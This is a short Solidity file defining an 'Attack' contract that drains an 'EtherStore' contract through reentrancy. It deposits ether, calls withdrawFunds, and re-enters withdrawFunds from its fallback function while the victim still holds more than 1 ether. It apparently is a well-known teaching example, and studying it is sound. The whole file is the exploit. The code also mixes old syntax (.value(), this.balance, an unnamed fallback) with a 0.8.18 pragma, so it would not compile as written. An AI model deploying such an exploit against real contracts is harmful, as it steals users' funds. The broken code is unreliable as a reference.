// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = _etherStoreAddress;
    }

    function attackEtherStore() public payable {
        require(msg.value >= 1 ether);

        etherStore.depositFunds.value(1 ether)();

        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(this.balance);
    }

    function() payable {
        if (etherStore.balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}